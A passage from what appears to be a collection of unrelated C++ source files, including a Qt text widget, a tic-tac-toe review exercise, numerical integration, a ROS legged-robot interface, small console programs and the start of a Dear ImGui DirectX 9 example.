\u521b\u5efa\u4e00\u4e2a QFont \u5bf9\u8c61\uff0c\u8bbe\u7f6e\u6307\u5b9a\u7684\u5b57\u53f7\n    QFont font;\n    font.setPointSize(fontSize);\n\n    // \u4f7f\u7528 QFontMetrics \u8ba1\u7b97\u884c\u9ad8\n    QFontMetrics metrics(font);\n    return metrics.lineSpacing();  // \u8fd4\u56de\u884c\u9ad8\n}\nint LyricTextEdit::getLineSpacing(int fontSize)\n{\n    QFont font;\n    font.setPointSize(fontSize);\n    QFontMetrics metrics(font);\n    return metrics.lineSpacing();  // \u884c\u95f4\u8ddd\n}\nvoid LyricTextEdit::scrollLines(int lines)\n{\n    int fontSize = 20;  // \u5047\u8bbe\u4f60\u4f7f\u7528\u7684\u662f 16 \u53f7\u5b57\u4f53\n\n    // \u83b7\u53d6\u884c\u95f4\u8ddd\uff08\u5305\u62ec\u884c\u9ad8\u548c\u989d\u5916\u7684\u7a7a\u95f4\uff09\n    int lineSpacing = getLineSpacing(fontSize);\n\n    QScrollBar *scrollBar = this->verticalScrollBar();\n    int currentValue = scrollBar->value();\n\n\n    scrollBar->setValue(currentValue + lines*lineSpacing);\n\n\n}\n\nLyricTextEdit::~LyricTextEdit()\n{\n    qDebug()<<\"Destruct LyricTextEdit\";\n}\n",
    "bool isWin(char game[3][3]){\nbool win = false;\nif (game[0][0] == game[0][1] && game[0][1] == game[0][2] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[1][0] == game[1][1] && game[1][1] == game[1][2] && (game[1][0]\n== 'X' || game[1][0] == 'O')) win = true;\nif (game[2][0] == game[2][1] && game[2][1] == game[2][2] && (game[2][0]\n== 'X' || game[2][0] == 'O')) win = true;\n// column\nif (game[0][0] == game[1][0] && game[1][0] == game[2][0] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[0][1] == game[1][1] && game[1][1] == game[2][1] && (game[0][1]\n== 'X' || game[0][1] == 'O')) win = true;\nif (game[0][2] == game[1][2] && game[1][2] == game[2][2] && (game[0][2]\n== 'X' || game[0][2] == 'O')) win = true;\n// diagonal\nif (game[0][0] == game[1][1] && game[1][1] == game[2][2] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[0][2] == game[1][1] && game[1][1] == game[2][0] && (game[0][2]\n== 'X' || game[0][2] == 'O')) win = true;\nreturn win;\n}\nint main(){\nint i, j;\nchar game[3][3] = {' '}; // Tic-tac-toe\nchar player1 = 'X';\nchar player2 = 'O';\nbool turn = true; // false for player 1's turn, true for player 2's turn.\nPlayer 1 first.\ncout << \"X = Player 1\" << endl << \"O = Player 2\" << endl;\nfor (int n=0; n<9; n++){\nturn = !turn; // use the not-operator to change true to false or\nfalse to true.\nif (turn == false)\ncout << \"Player 1: \";\nelse\ncout << \"Player 2: \";\ncout << \"Which cell to mark? i:[1..3], j:[1..3]: \";\ncin >> i >> j;\nif (turn == false)\ngame[i][j] = 'X';\n10 Modern Code Review Exercise CS5351 2024/2025\nelse\ngame[i][j] = 'O';\nif (isWin(game)){\ncout << \"Win!\" << endl;\nbreak; // need to terminate the problem\n}\n}\nif (i==3) // all celles with i=0 to 2 have been inputted above but no\nwinner yet\ncout << \"Tie!\" << endl;\n// show the game to console\ncout << game[0][0] << \" \" << game[0][1] << \" \" << game[0][2] << endl;\ncout << game[1][0] << \" \" << game[1][1] << \" \" << game[1][2] << endl;\ncout << game[2][0] << \" \" << game[2][1] << \" \" << game[2][2] << endl;\nreturn 0;\n}\n",
    "#include <iostream>  \n#include <iomanip>         \n#include <cmath>\n\nusing std::cout;           \nusing std::cin;           \nusing std::endl;          \nusing std::fixed;          \nusing std::setprecision;  \n\nconst double pi = 3.141592653589793;                    // Define the constant pi with high precision\n\n//----------------------------------------------Function Definitions--------------------------------------------\n// Define the function f(x) = x * sin(x)\ndouble f(double x)\n{\n    return x * sin(x);\n}\n\n// Compute the integral of f(x) using the trapezoidal rule\nvoid trapezoidal_rule(double lower_limit, double upper_limit, int number_of_divisions)\n{\n    double a = lower_limit;                             // Set the lower limit of integration\n    double b = upper_limit;                             // Set the upper limit of integration\n    int n = number_of_divisions;                        // Set the number of divisions for the trapezoidal rule\n    double h = (b - a) / n;                             // Compute the width of each trapezoid\n    double S = 0.5 * (f(a) + f(b));                     // Initialize the sum with the average of function values at the ends\n    for (int i = 1; i < n; i++)                         // Iterate through the divisions\n    {\n        S += f(a + i * h);                              // Add the function value at each subdivision point\n    }\n    double Integral = h * S;                            // Compute the integral as the width times the sum\n    cout << fixed << setprecision(16) << \"Integral \" << Integral << \" [using trapezoidal rule]\" << endl; // Output the result with fixed precision\n}\n\n// Compute the integral of f(x) using Simpson's 1/3 rule\nvoid simpsons1_3rule(double lower_limit, double upper_limit, int number_of_divisions)\n{\n    double a = lower_limit;                             // Set the lower limit of integration\n    double b = upper_limit;                             // Set the upper limit of integration\n    int n = number_of_divisions;                        // Set the number of divisions for Simpson's 1/3 rule\n    double h = (b - a) / n;                             // Compute the width of each interval\n    double S = f(a) + f(b);                             // Initialize the sum with the function values at the ends\n    for (int i = 1; i < n; i += 2)                      // Iterate over odd indices\n    {\n        S += 4 * f(a + i * h);                          // Add 4 times the function value at each odd index\n    }\n    for (int i = 2; i < n; i += 2)                      // Iterate over even indices\n    {\n        S += 2 * f(a + i * h);                          // Add 2 times the function value at each even index\n    }\n    double Integral = (h / 3) * S;                      // Compute the integral using Simpson's 1/3 rule formula\n    cout << \"Integral \" << Integral << \" [using simpson's 1/3 rule]\" << endl; // Output the result\n}\n\n// Compute the integral of f(x) using Simpson's 3/8 rule\nvoid simpsons3_8rule(double lower_limit, double upper_limit, int number_of_divisions)\n{\n    double a = lower_limit;                             // Set the lower limit of integration\n    double b = upper_limit;                             // Set the upper limit of integration\n    int n = number_of_divisions;                        // Set the number of divisions for Simpson's 3/8 rule\n    double h = (b - a) / n;                             // Compute the width of each interval\n    double S = f(a) + f(b);                             // Initialize the sum with the function values at the ends\n    for (int i = 1; i < n; i += 3)                      // Iterate over indices with step 3\n    {\n        S += 3 * (f(a + i * h) + f(a + (i + 1) * h));   // Add 3 times the sum of function values at each set of 3 points\n    }\n    for (int i = 3; i < n; i += 3)                      // Iterate over indices with step 3 starting from 3\n    {\n        S += 2 * f(a + i * h);                          // Add 2 times the function value at each subsequent set of 3 points\n    }\n    double Integral = ((3 * h) / 8) * S;                // Compute the integral using Simpson's 3/8 rule formula\n    cout << \"Integral \" << Integral << \" [using simpson's 3/8 rule]\" << endl; // Output the result\n}\n\n//--------------------------------------------------Main Program------------------------------------------------\nint main(int argc, char **argv)\n{\n    double lower_limit = 0;                             // Set lower limit of integration\n    double upper_limit = pi / 2;                        // Set upper limit of integration (\u03c0/2)\n    trapezoidal_rule(lower_limit, upper_limit, 100);    // Compute and print integral using trapezoidal rule with 100 divisions\n    simpsons1_3rule(lower_limit, upper_limit, 18);      // Compute and print integral using Simpson's 1/3 rule with 18 divisions\n    simpsons3_8rule(lower_limit, upper_limit, 18);      // Compute and print integral using Simpson's 3/8 rule with 18 divisions\n\n    return 0; // End",
    "#include \"interfaces/BaseInterface.h\"\n\nnamespace legged {\n\n    BaseInterface::BaseInterface(ros::NodeHandle &_nh) {\n        nh = _nh;\n        sub_joy_msg = nh.subscribe(\"/joy\", 1000, &BaseInterface::joy_callback, this);\n        // low_level_gains_msg = nh.subscribe(\"/a1_debug/low_level_gains\", 100, &BaseInterface::gain_callback, this);\n\n        // Go1 Kinematics\n        // leg order: 0-FL  1-FR  2-RL  3-RR\n        leg_offset_x[0] = 0.1881;\n        leg_offset_x[1] = 0.1881;\n        leg_offset_x[2] = -0.1881;\n        leg_offset_x[3] = -0.1881;\n        leg_offset_y[0] = 0.04675;\n        leg_offset_y[1] = -0.04675;\n        leg_offset_y[2] = 0.04675;\n        leg_offset_y[3] = -0.04675;\n        motor_offset[0] = 0.0812;\n        motor_offset[1] = -0.0812;\n        motor_offset[2] = 0.0812;\n        motor_offset[3] = -0.0812;\n        upper_leg_length[0] = upper_leg_length[1] = upper_leg_length[2] = upper_leg_length[3] = UPPER_LEG_LENGTH;\n        lower_leg_length[0] = lower_leg_length[1] = lower_leg_length[2] = lower_leg_length[3] = LOWER_LEG_LENGTH;\n\n        for (int i = 0; i < NUM_LEG; i++) {\n            Eigen::VectorXd rho_fix(5);\n            rho_fix << leg_offset_x[i], leg_offset_y[i], motor_offset[i], upper_leg_length[i], lower_leg_length[i];\n            Eigen::VectorXd rho_opt(3);\n            rho_opt << 0.0, 0.0, 0.0;\n            rho_fix_list.push_back(rho_fix);\n            rho_opt_list.push_back(rho_opt);\n        }\n\n        // load parameter is very important\n        legged_state.param.load(_nh);\n\n        // raibert heuristic\n        k = 0;\n        raibert_delta_rel.setZero();\n        raibert_delta_abs.setZero();\n\n        // set filters for terrain adaptation\n        for (int i = 0; i < NUM_LEG; i++) {\n            recent_contact_pos_x_filter[i] = MovingWindowFilter(1000.0 / MPC_UPDATE_PERIOD * 0.5);\n            recent_contact_pos_y_filter[i] = MovingWindowFilter(1000.0 / MPC_UPDATE_PERIOD * 0.5);\n            recent_contact_pos_z_filter[i] = MovingWindowFilter(1000.0 / MPC_UPDATE_PERIOD * 0.5);\n        }\n\n        // set CasADi EKF\n        ekf.set_noise_params(\n            legged_state.param.ekf_inital_cov,\n            legged_state.param.ekf_noise_process_pos_xy,\n            legged_state.param.ekf_noise_process_pos_z,\n            legged_state.param.ekf_noise_process_vel_xy,\n            legged_state.param.ekf_noise_process_vel_z,\n            legged_state.param.ekf_noise_process_rot,\n            legged_state.param.ekf_noise_process_foot,\n            legged_state.param.ekf_noise_measure_fk,\n            legged_state.param.ekf_noise_measure_vel,\n            legged_state.param.ekf_noise_measure_height,\n            legged_state.param.ekf_noise_opti_pos,\n            legged_state.param.ekf_noise_opti_vel,\n            // legged_state.param.ekf_noise_opti_roll,\n            // legged_state.param.ekf_noise_opti_pitch,\n            legged_state.param.ekf_noise_opti_yaw\n        );\n    }\n\n    void BaseInterface::joy_callback(const sensor_msgs::Joy::ConstPtr &joy_msg) {\n        // LB\n        if (joy_msg->buttons[legged_state.param.joystick_exit_button] == 1) {\n            std::cout << \"You have pressed the exit button!\" << std::endl;\n            legged_state.joy.exit = true;\n        }\n        // Y\n        if (joy_msg->buttons[legged_state.param.sin_ang_vel_button]) legged_state.joy.sin_ang_vel = true;\n        else if (joy_msg->buttons[legged_state.param.sin_ang_vel_button] == 0) legged_state.joy.sin_ang_vel = false;\n        // A\n        if (joy_msg->buttons[legged_state.param.joystick_mode_switch_button] == 1) {\n            std::cout << std::endl << \"You have requested to change legged_state!\" << std::endl << std::endl;\n            legged_state.joy.ctrl_state_change_request = true;\n        }\n        // B\n        if (joy_msg->buttons[legged_state.param.joystick_default_pos_button] == 1) {\n            legged_state.joy.default_pos_request = true;\n        }\n        // X\n        if (joy_msg->buttons[legged_state.param.joystick_zero_torque_button] == 1) {\n            legged_state.joy.zero_torque_request = true;\n        }\n\n        // linear velocity x: right updown\n        legged_state.joy.velx = joy_msg->axes[legged_state.param.joystick_right_updown_axis] * legged_state.param.joystick_velx_scale;\n        // linear velocity y: right horizon\n        legged_state.joy.vely = joy_msg->axes[legged_state.param.joystick_right_horiz_axis] * legged_state.param.joystick_vely_scale;\n        // linear velocity z: left updown\n        legged_state.joy.velz = joy_msg->axes[legged_state.param.joystick_left_updown_axis] * legged_state.param.joystick_height_vel;\n\n        // Euler angular velocity Roll: cross left and right\n        switch ((int)joy_msg->axes[legged_state.param.joystick_cross_left_right_axis]) {\n            case -1:\n                legged_state.joy.roll_rate = legged_state.param.joystick_roll_rate_scale;\n                break;\n            case 0:\n                legged_state.joy.roll_rate = 0.0;\n                break;\n            case 1:\n  ",
    "//---------------------------------------------------------------------------\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#pragma hdrstop\r\n\r\n#include \"lcrng.h\"\r\n\r\n//---------------------------------------------------------------------------\r\n#pragma package(smart_init)\r\n//---------------------------------------------------------------------------\r\nCLCRNG::CLCRNG()\r\n{\r\n    seed = time(NULL);\r\n}\r\n//---------------------------------------------------------------------------\r\nCLCRNG::CLCRNG(uint32_t nseed)\r\n{\r\n    setSeed(nseed);\r\n}\r\n//---------------------------------------------------------------------------\r\nCLCRNG::~CLCRNG()\r\n{\r\n}\r\n//---------------------------------------------------------------------------\r\nvoid CLCRNG::setSeed(uint32_t nseed)\r\n{\r\n    seed = nseed;\r\n    next = seed;\r\n    Run();\r\n}\r\n//---------------------------------------------------------------------------\r\nvoid CLCRNG::setSeed(const char* seedstr)\r\n{\r\n    int len = strlen(seedstr);\r\n    uint32_t nsd = 0, buf = 0;\r\n\r\n    for (int i = 0; i < len; i++) {\r\n        buf <<= 8;\r\n        buf |= seedstr[i];\r\n        if ((i & 3) == 3) {\r\n            nsd += buf;\r\n            buf = 0;\r\n        }\r\n    }\r\n    nsd += buf;\r\n\r\n    setSeed(nsd);\r\n}\r\n//---------------------------------------------------------------------------\r\nvoid CLCRNG::Run()\r\n{\r\n    next = (LCRNG_A * next + LCRNG_C) % LCRNG_M;\r\n}\r\n//---------------------------------------------------------------------------\r\nuint32_t CLCRNG::getDWord()\r\n{\r\n    Run();\r\n    return next;\r\n}\r\n//---------------------------------------------------------------------------\r\nint CLCRNG::getPosInt()\r\n{\r\n    Run();\r\n    int r = next & 0x7FFFFFFFUL;\r\n    return r;\r\n}\r\n//---------------------------------------------------------------------------\r\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MovingPlatform.h\"\n\n// Sets default values\nAMovingPlatform::AMovingPlatform()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tStartLocation = GetActorLocation();\n\n\tFString Name = GetName();\n\n\tUE_LOG(LogTemp, Display, TEXT(\"BeginPlay: %s\"), *Name);\n}\n\n// Called every frame\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\tMovePlatform(DeltaTime);\n\tRotatePlatform(DeltaTime);\n}\n\nvoid AMovingPlatform::MovePlatform(float DeltaTime){\n\tif (ShouldPlatformReturn()) {\n\t\tFVector MoveDirection = PlatformVelocity.GetSafeNormal();\n\t\tStartLocation = StartLocation + MoveDirection * MoveDistance;\n\t\tSetActorLocation(StartLocation);\n\t\tPlatformVelocity = -PlatformVelocity;\n\t} else{\n\t\tFVector CurrentLocation = GetActorLocation();\n\t\tCurrentLocation = CurrentLocation + (PlatformVelocity * DeltaTime);\n\t\tSetActorLocation(CurrentLocation);\n\t}\n}\n\nvoid AMovingPlatform::RotatePlatform(float DeltaTime){\n\tAddActorLocalRotation(RotationVelocity * DeltaTime);\n}\n\nbool AMovingPlatform::ShouldPlatformReturn() const{\n\treturn GetDistanceMoved() > MoveDistance;\n}\n\nfloat AMovingPlatform::GetDistanceMoved() const{\n\treturn FVector::Dist(StartLocation, GetActorLocation());\n}",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct AlatBerat\r\n{\r\n    string nama;\r\n    string jenis;\r\n    string sewaperhari;\r\n    bool disewa;\r\n};\r\n\r\nconst int maks_data = 100;\r\nAlatBerat *dataAlat[maks_data];\r\nint jumlahAlat = 0;\r\n\r\nbool tambahAlat(){\r\n    system(\"cls\");\r\n    if (jumlahAlat < maks_data) {\r\n        dataAlat[jumlahAlat] = new AlatBerat;\r\n        cout << \"Masukkan nama alat berat: \";\r\n        getline(cin, dataAlat[jumlahAlat]->nama);\r\n        cout << \"Masukkan jenis alat berat: \";\r\n        getline(cin, dataAlat[jumlahAlat]->jenis);\r\n        cout << \"Masukkan sewa per hari: \";\r\n        getline(cin, dataAlat[jumlahAlat]->sewaperhari);\r\n        dataAlat[jumlahAlat]->disewa = false;\r\n        jumlahAlat++;\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Alat berhasil ditambahkan.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        return true;\r\n    } else {\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Data sudah penuh.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        return false;\r\n    }\r\n}\r\n\r\nvoid tampilkanAlat() {\r\n    system(\"cls\");\r\n    if (jumlahAlat == 0) {\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Tidak ada alat yang tersedia.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n    } else {\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Alat yang tersedia:\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        for (int i = 0; i <jumlahAlat; ++i) {\r\n            cout << \"Nama Alat: \" << dataAlat[i]->nama << endl;\r\n            cout << \"Jenis Alat: \" << dataAlat[i]->jenis << endl;\r\n            cout << \"Harga Sewa Per Hari: \" << dataAlat[i]->sewaperhari << endl;\r\n            cout << \"Status: \" << (dataAlat[i]->disewa ? \"Disewa\" : \"Tersedia\") << endl;\r\n            cout << \"===========================================\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\nvoid updateAlat (const string &namaAlat, const AlatBerat &dataBaru, int index = 0){\r\n    if (index < jumlahAlat) {\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Alat dengan nama \" << namaAlat << \" tidak ditemukan.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        return;\r\n    } \r\n\r\n    if (dataAlat[index]->nama == namaAlat) {\r\n        *dataAlat[index] = dataBaru; // Update data menggunakan pointer\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Data alat dengan nama \" << namaAlat << \" berhasil diupdate.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        return;\r\n    }\r\n\r\n    updateAlat(namaAlat, dataBaru, index + 1); \r\n}\r\n\r\nbool hapusAlat() {\r\n    system(\"cls\");\r\n    tampilkanAlat();\r\n    string namaAlat;\r\n    cout << \"Masukkan nama alat yang ingin dihapus: \";\r\n    getline(cin, namaAlat);\r\n\r\n    bool alatDitemukan = false;\r\n    for (int i = 0; i < jumlahAlat; ++i) {\r\n        if (dataAlat[i]->nama == namaAlat) {\r\n            delete dataAlat[i]; // Hapus pointer dari memori\r\n            for (int j = i; j < jumlahAlat - 1; ++j) {\r\n                dataAlat[j] = dataAlat[j + 1];\r\n            }\r\n            jumlahAlat--;\r\n            alatDitemukan = true;\r\n            cout << \"===========================================\" << endl;\r\n            cout << \"Alat berhasil dihapus.\" << endl;\r\n            cout << \"===========================================\" << endl;\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (!alatDitemukan) {\r\n        cout << \"===========================================\" << endl;\r\n        cout << \"Alat tidak ditemukan.\" << endl;\r\n        cout << \"===========================================\" << endl;\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    system(\"cls\");\r\n    int pilihan;\r\n    do {\r\n        cout << \"\\nMenu Utama:\" << endl;\r\n        cout << \"1. Tambah data alat\" << endl;\r\n        cout << \"2. Tampilkan data alat\" << endl;\r\n        cout << \"3. Update data alat\" << endl;\r\n        cout << \"4. Hapus data alat\" << endl;\r\n        cout << \"5. Keluar\" << endl;\r\n        cout << \"Pilihan: \";\r\n        cin >> pilihan;\r\n        cin.ignore();\r\n\r\n        switch (pilihan) {\r\n            case 1:\r\n                tambahAlat();\r\n                break;\r\n            case 2:\r\n                tampilkanAlat();\r\n                break;\r\n            case 3:\r\n                {\r\n                    string namaAlat;\r\n                    AlatBerat dataBaru;\r\n                    cout << \"===========================================\" << endl;\r\n                    cout << \"Masukkan nama alat yang ingin diupdate: \";\r\n                    getline(cin, namaAlat);\r\n                    cout << \"Masukkan data baru\" << endl;\r\n  ",
    "#include \"RdExtBase.h\"\n\n#include \"lifetime/Lifetime.h\"\n#include \"base/RdPropertyBase.h\"\n#include \"protocol/Protocol.h\"\n#include \"scheduler/SynchronousScheduler.h\"\n\nnamespace rd\n{\nconst IProtocol* RdExtBase::get_protocol() const\n{\n\treturn extProtocol ? extProtocol.get() : RdReactiveBase::get_protocol();\n}\n\n// must be overriden if derived ext have bindable members\nvoid RdExtBase::init(Lifetime lifetime) const\n{\n\t//    Protocol.initializationLogger.traceMe { \"binding\" }\n\n\tauto parentProtocol = RdReactiveBase::get_protocol();\n\tstd::shared_ptr<IWire> parentWire = parentProtocol->wire;\n\n\t//    serializersOwner.registry(parentProtocol.serializers);\n\n\tIScheduler* sc = parentProtocol->get_scheduler();\n\textWire->realWire = parentWire.get();\n\tlifetime->bracket(\n\t\t[&] {\n\t\t\textProtocol =\n\t\t\t\tstd::make_shared<Protocol>(parentProtocol->identity, sc, std::static_pointer_cast<IWire>(extWire), lifetime);\n\t\t},\n\t\t[this] { extProtocol = nullptr; });\n\n\tparentWire->advise(lifetime, this);\n\n\t// it's critical to advise before 'Ready' is sent because we advise on SynchronousScheduler\n\n\tlifetime->bracket([this, parentWire] { sendState(*parentWire, ExtState::Ready); },\n\t\t[this, parentWire] { sendState(*parentWire, ExtState::Disconnected); });\n\n\tfor (auto const& it : bindable_extensions)\n\t{\n\t\tbindPolymorphic(*(it.second), lifetime, this, it.first);\n\t}\n\ttraceMe(Protocol::initializationLogger, \"created and bound\");\n}\n\nvoid RdExtBase::on_wire_received(Buffer buffer) const\n{\n\tExtState remoteState = buffer.read_enum<ExtState>();\n\ttraceMe(spdlog::get(\"logReceived\"), \"remote: \" + to_string(remoteState));\n\n\tswitch (remoteState)\n\t{\n\t\tcase ExtState::Ready:\n\t\t{\n\t\t\tsendState(*extWire->realWire, ExtState::ReceivedCounterpart);\n\t\t\textWire->connected.set(true);\n\t\t\tbreak;\n\t\t}\n\t\tcase ExtState::ReceivedCounterpart:\n\t\t{\n\t\t\textWire->connected.set(true);\t // don't set anything if already set\n\t\t\tbreak;\n\t\t}\n\t\tcase ExtState::Disconnected:\n\t\t{\n\t\t\textWire->connected.set(false);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tint64_t counterpartSerializationHash = buffer.read_integral<int64_t>();\n\tif (serializationHash != counterpartSerializationHash)\n\t{\n\t\tRD_ASSERT_MSG(false, \"serializationHash of ext \" + to_string(location) +\n\t\t\t\t\t\t\t\t \" doesn't match to counterpart: maybe you forgot to generate models?\\n\"\n\t\t\t\t\t\t\t\t \"our: \" +\n\t\t\t\t\t\t\t\t to_string(serializationHash) + \", counterpart:\" + to_string(counterpartSerializationHash))\n\t}\n}\n\nvoid RdExtBase::sendState(IWire const& wire, ExtState state) const\n{\n\twire.send(rdid, [&](Buffer& buffer) {\n\t\tbuffer.write_enum<ExtState>(state);\n\t\tbuffer.write_integral<int64_t>(serializationHash);\n\t});\n}\n\nvoid RdExtBase::traceMe(std::shared_ptr<spdlog::logger> logger, string_view message) const\n{\n\tlogger->trace(\"ext {} {}:: {}\", to_string(location), to_string(rdid), std::string(message));\n}\n\nIScheduler* RdExtBase::get_wire_scheduler() const\n{\n\treturn &SynchronousScheduler::Instance();\n}\n\nstd::string to_string(RdExtBase::ExtState state)\n{\n\tswitch (state)\n\t{\n\t\tcase RdExtBase::ExtState::Ready:\n\t\t\treturn \"Ready\";\n\t\tcase RdExtBase::ExtState::ReceivedCounterpart:\n\t\t\treturn \"ReceivedCounterpart\";\n\t\tcase RdExtBase::ExtState::Disconnected:\n\t\t\treturn \"Disconnected\";\n\t}\n\treturn {};\n}\n}\t // namespace rd\n",
    "#include<iostream>\r\nusing namespace std;\r\nint main(){\r\n\tint p[8]={1,1,1,1,0,0,0,0},\r\n\tq[8]={1,1,0,0,1,1,0,0},\r\n\tr[8]={1,0,1,0,1,0,1,0},\r\n\tm[8],n[8],a[8];\r\n\tfor(int i=0;i<8;i++){\r\n\t\tif(p[i]==1&&q[i]==0){\r\n\t\t\tm[i]=0;\r\n\t\t}\r\n\t\telse{\r\n\t\t\tm[i]=1;\r\n\t\t}\r\n\t}\r\n\tfor(int i=0;i<8;i++){\r\n\t\tif(q[i]==1&&r[i]==0){\r\n\t\t\tn[i]=0;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tn[i]=1;\r\n\t\t}\r\n\t}\r\n\tfor(int i=0;i<8;i++){\r\n\t\tif(p[i]==1&&r[i]==0){\r\n\t\t\ta[i]=0;\r\n\t\t}\r\n\t\telse{\r\n\t\t\t\r\n\t\t\ta[i]=1;\r\n\t\t}\r\n\t}\r\n\t\r\n\tcout<<\"-----------------------------------------------------\"<<endl;\r\n\tcout<<\"|p  |\"<<\"\\t\"<<\"q  |\"<<\"\\t\"<<\"r  |\"<<\"\\t\"<<\"(p->q)\"<<\"  |\"<<\"(q->r)\"<<\"  |\"<<\"(p->r)\"<<\"    |\"<<endl;\r\n\tcout<<\"-----------------------------------------------------\"<<endl;\r\n\tfor(int i=0;i<8;i++){\r\n\t\tcout<<\"|\"<<p[i]<<\"  |\"<<\"\\t\"<<q[i]<<\"  |\"<<\"\\t\"<<r[i]<<\"  |\"<<\"\\t\"<<\" \"<<m[i]<<\"\\t|\"<<\" \"<<n[i]<<\"\\t\"<<\" |\"<<\"\\t\"<<a[i]<<\"   |\"<<endl;\r\n\t}\r\n\t\tcout<<\"-----------------------------------------------------\"<<endl;\r\n\tfor(int i=0;i<8;i++){\r\n\t\tif(m[i]==1&&n[i]==1&&a[i]==1){\r\n\t\t\tcout<<\"if (p->q) is true and (q->r) is also true  then (p->r) is also true (hypothetical syllogism)\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\t\r\n\treturn 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <iomanip> // this library to align (scores/balls played) with setw and left in summary\r\n\r\nusing namespace std;\r\n\r\nclass Player{\r\nprivate:\r\n    string playerName;\r\n    int totalScore;\r\n    int ballsPlayed;\r\n\r\npublic:\r\n\r\n    void setName(string name){\r\n        playerName = name;\r\n    }\r\n    string getName(){\r\n        return playerName;\r\n    }\r\n    void setScore(int score){\r\n        totalScore = score;\r\n    }\r\n    int getScore(){\r\n        return totalScore;\r\n    }\r\n    void setBalls(int balls){\r\n        ballsPlayed = balls;\r\n    }\r\n    int getBalls(){\r\n        return ballsPlayed;\r\n    }\r\n\r\n    Player(){\r\n        playerName = \"\";\r\n        totalScore = 0;\r\n        ballsPlayed = 0;\r\n    }\r\n};\r\n\r\nint main(){\r\n\r\n    string playerNames[] = {\r\n        \"Babar Azam\", \"Naseem Shah\", \"Agha Salman\", \"Mohammad Amir\",\r\n        \"Shaheen Afridi\", \"Shadab Khan\", \"Imad Waseem\", \"Fakhar Zaman\",\r\n        \"Haris Rauf\", \"Muhammad Rizwan\", \"Iftikhar Ahmed\"\r\n    };\r\n\r\n    Player players[11];\r\n\r\n    srand(time(0));   //randomly assigning \r\n\r\n    int maxScore;\r\n    string manOfTheMatch;\r\n\r\n    for(int i = 0; i < 11; i++){\r\n        players[i].setName(playerNames[i]);\r\n        int totalScore = 0;\r\n        int ballsPlayed = 0;\r\n\r\n        cout << i + 1 << \". \" << players[i].getName() <<endl;\r\n        cout << \"Scores per Ball: \";\r\n\r\n        while (true){\r\n            int score = (rand() % 7) - 1; \r\n            if (score == 5) continue; \r\n\r\n            if (score == -1){\r\n                cout << \"OUT\";\r\n                ballsPlayed++;\r\n                break;\r\n\r\n            } \r\n            \r\n            else{\r\n                cout << score;\r\n                totalScore += score;\r\n                ballsPlayed++;\r\n                if (ballsPlayed < 10) cout << \", \";\r\n            }\r\n\r\n            if (ballsPlayed >= 10) break; \r\n        }\r\n\r\n        players[i].setScore(totalScore);\r\n        players[i].setBalls(ballsPlayed);\r\n\r\n        cout <<endl;\r\n        cout << \"Total Score: \" << players[i].getScore() << \"            Balls played: \" << players[i].getBalls() <<endl;\r\n\r\n        cout << endl;\r\n\r\n\r\n        // man of match\r\n        if (totalScore > maxScore) {\r\n            maxScore = totalScore;\r\n            manOfTheMatch = players[i].getName();\r\n        }\r\n    }\r\n\r\n    // summary of match\r\n    cout << \"<<<<<<< Match Summary >>>>>>>>\" <<endl;\r\n\r\n    cout << left << setw(20) << \"Player Name\" <<setw(15) << \"Score\" << \"Balls played\" <<endl;\r\n\r\n    for(int i = 0; i < 11; i++){\r\n        cout << left << setw(20) << players[i].getName() << setw(15) << players[i].getScore() << players[i].getBalls() <<endl;\r\n\r\n    }\r\n    cout << endl;\r\n\r\n    cout << \"Man of the match: \" << manOfTheMatch <<endl <<endl;\r\n\r\n    cout << \"___________________________________\" <<endl <<endl;\r\n\r\n    system(\"pause\");\r\n\r\n    return 0;\r\n}\r\n",
    "// Dear ImGui: standalone example application for DirectX 9\n#pragma comment(linker, \"/SUBSYSTEM:windows /ENTRY:mainCRTStartup\") //For No Console \n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx9.h\"\n#include \"imgui_impl_win32.h\"\n#include <d3d9.h>\n#include <tchar.h>\n#include <Windows.h>\n#include <dwmapi.h>\n#include <iostream>\n\n// Data\nstatic LPDIRECT3D9              g_pD3D = nullptr;\nstatic LPDIRECT3DDEVICE9        g_pd3dDevice = nullptr;\nstatic bool                     g_DeviceLost = false;\nstatic UINT                     g_ResizeWidth = 0, g_ResizeHeight = 0;\nstatic D3DPRESENT_PARAMETERS    g_d3dpp = {};\n\n// Forward declarations of helper functions\nbool CreateDeviceD3D(HWND hWnd);\nvoid CleanupDeviceD3D();\nvoid ResetDevice();\nLRESULT WINAPI 